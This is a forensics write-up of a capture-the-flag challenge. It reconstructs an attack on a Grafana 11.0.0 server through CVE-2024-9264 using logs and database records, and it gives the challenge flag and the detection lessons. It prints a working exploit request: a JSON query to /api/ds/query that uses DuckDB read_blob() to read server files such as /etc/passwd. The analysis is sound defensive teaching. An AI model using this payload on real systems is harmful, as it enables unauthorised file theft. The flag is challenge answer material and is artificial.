# DukesDBar — Forensics Write-up

**CTF:** Midnight Flag CTF 2026
**Category:** Forensics
**Flag:** `MCTF{CVE-2024-9264:/var/lib/grafana/ctf/secret.csv:85.215.144.254:editor2}`

---

## TL;DR

Grafana 11.0.0 instance with `sqlExpressions` feature flag enabled — vulnerable to CVE-2024-9264. An attacker used the `editor2` account from `85.215.144.254` (python-requests) to run DuckDB SQL via the Expression datasource and exfiltrate `/var/lib/grafana/ctf/secret.csv`. The exploit traffic was camouflaged by legitimate service account noise.

---

## Artifacts

- `grafana.log` — 9,807 lines of Grafana debug logs (2025-12-02)
- `grafana.db` — SQLite database with users, tokens, dashboards, datasources

---

## Vulnerability: CVE-2024-9264

**Grafana SQL Expressions Arbitrary File Read / RCE**

Affects Grafana < 11.0.5 when the `sqlExpressions` feature toggle is enabled. Any authenticated user can POST to `/api/ds/query` using the built-in `__expr__` datasource with `type: "sql"` and execute arbitrary DuckDB SQL — including `read_blob('/path/to/file')` to read files from the server filesystem.

**Evidence in log (line 14):**
```
GF_FEATURE_TOGGLES_ENABLE=sqlExpressions
```

---

## Attack Timeline

| Time (UTC) | IP | User | Action |
|---|---|---|---|
| 10:02 | — | — | Grafana 11.0.0 starts |
| 10:08 | `2a02:8440:7132:3d4f:43f1:dca5:5a7f:c9c` | admin | Logs in |
| 10:09 | internal | admin | Creates Prometheus datasource |
| 10:12 | `2a02:8440:...` | admin | Creates service account `sa-1-checkup` |
| 10:13–10:14 | `2a02:8440:...` / `212.114.18.5` | sa-1-checkup | 20x POST `/api/ds/query` → all **400** (`invalidDatasourceId`) |
| 10:17 | internal | admin | Creates user `editor2` |
| 10:18 | `212.114.18.5` | viewer1 | Browser login |
| 10:37 | `212.114.18.5` | admin | Browser session |
| **10:20:16** | **`85.215.144.254`** | **editor2** | CVE-2024-9264 probe: `SELECT content FROM read_blob('/etc/passwd')` |
| **10:20:37** | **`85.215.144.254`** | **editor2** | CVE-2024-9264 exfiltration: `SELECT content FROM read_blob('/var/lib/grafana/ctf/secret.csv')` |
| 14:06 | — | — | Grafana restarts |
| 14:08 | `212.114.18.5` | editor1 | Browser session |

---

## Exploit Mechanics

The attacker used `editor2` credentials with `python-requests/2.31.0` — scripted exploitation. The request body that triggered the file read:

```json
{
  "queries": [{
    "datasource": {
      "name": "Expression",
      "type": "__expr__",
      "uid": "__expr__"
    },
    "expression": "SELECT content FROM read_blob('/var/lib/grafana/ctf/secret.csv')",
    "refId": "B",
    "type": "sql"
  }]
}
```

This is logged at `query_data` debug level — **no HTTP `Request Completed` entry** for the exploit requests, making them invisible to access-log-only monitoring.

---

## Deception Layer

The `sa-1-checkup` service account sent 20 consecutive POST `/api/ds/query` requests (all returning 400 `invalidDatasourceId`) from both `2a02:8440:...` and `212.114.18.5`. This appears to be:
1. Reconnaissance to enumerate valid datasource IDs
2. Noise to camouflage the actual exploitation by `editor2` from a third IP

The actual exploit came from a **different IP** (`85.215.144.254`) using a **different account** (`editor2`) — only visible in `query_data` debug logs.

---

## Database Evidence

`user_auth_token` table confirms `editor2` (userId=5) logged in from `85.215.144.254` using `python-requests/2.31.0`:

```
tokenID=3 | userID=5 | clientIP=85.215.144.254 | userAgent=python-requests/2.31.0
tokenID=4 | userID=5 | clientIP=85.215.144.254 | userAgent=python-requests/2.31.0
```

---

## Flag Components

| Component | Value |
|---|---|
| CVE | `CVE-2024-9264` |
| Exfiltrated file | `/var/lib/grafana/ctf/secret.csv` |
| Attacker IP | `85.215.144.254` |
| Username | `editor2` |

```
MCTF{CVE-2024-9264:/var/lib/grafana/ctf/secret.csv:85.215.144.254:editor2}
```

---

## Key Lessons

1. **Feature flags in production = attack surface.** `sqlExpressions` was intentionally enabled and created a critical LFI.
2. **Debug logs contain what access logs hide.** The exploit had no HTTP-level log entry — only `query_data` debug logs captured it.
3. **Noise ≠ threat.** The 20 400-error requests from `sa-1-checkup` were a distraction. The real attacker used a different account and IP.
4. **`python-requests` in auth tokens is suspicious.** Interactive users use browsers; scripted exploitation uses requests libraries.

---

## References

- [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264) — Grafana SQL Expressions plugin arbitrary file read
- [Grafana Security Advisory](https://grafana.com/security/security-advisories/cve-2024-9264/)
- PoC: POST `/api/ds/query` with `type: "sql"` + DuckDB `read_blob()`
